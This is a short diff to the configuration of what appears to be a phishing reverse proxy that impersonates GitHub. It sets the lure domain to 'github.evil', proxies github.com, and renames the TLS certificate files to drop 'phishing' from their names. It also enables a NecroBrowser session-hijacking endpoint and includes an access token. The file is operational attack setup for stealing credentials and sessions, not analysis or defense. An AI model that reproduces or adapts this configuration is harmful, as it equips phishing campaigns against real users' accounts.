@@ -1,6 +1,6 @@
 {
   "proxy": {
-    "phishing": "phishing.anti",
+    "phishing": "github.evil",
     "destination": "github.com",
     "skipContentType": [
       "font/*",
@@ -81,9 +81,9 @@
   "tls": {
     "enabled": true,
     "expand": false,
-    "certificate": "./config/phishing-cert.pem",
-    "key": "./config/phishing-key.pem",
-    "root": "./config/phishing-rootCA.pem"
+    "certificate": "./config/cert.pem",
+    "key": "./config/privkey.pem",
+    "root": "./config/fullchain.pem"
   },
   "crawler": {
     "enabled": false,
@@ -128,7 +128,7 @@
   },
   "necrobrowser": {
     "enabled": true,
-    "endpoint": "http://10.0.60.34:8080",
+    "endpoint": "http://127.0.0.1:8888",
     "token": "ada9f7b8-6e6c-4884-b2a3-ea757c1eb617",
     "profile": "github",
     "keywords": null
